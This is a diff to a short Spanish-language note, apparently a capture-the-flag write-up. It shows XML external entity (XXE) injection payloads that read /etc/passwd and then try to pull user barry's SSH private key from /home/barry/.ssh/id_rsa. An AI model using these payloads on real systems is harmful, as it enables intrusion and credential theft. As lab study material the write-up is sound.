@@ -57,6 +57,7 @@ parece que tenemos un archivo xml
 ![[Pasted image 20231211222919.png]]
 ### xml inyection 
 usaremos esta xml inyeccion para intentar mirar el etc/passwd
+
 ```python
 <?xml version="1.0" encoding="UTF-8"?> 
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]> 
@@ -69,3 +70,13 @@ usaremos esta xml inyeccion para intentar mirar el etc/passwd
 
 ![[Pasted image 20231212001031.png]]
 ### perfecto tenemos respuesta. vemos que existe un usuario llamado barry. vamos a intentar consegui su id_rsa modificando la ruta en el xml
+
+```python
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]> 
+<comment> 
+<name>Joe Hamd</name> 
+<author>Barry Clad</author> 
+<com>&test; </com> 
+</comment>
+```
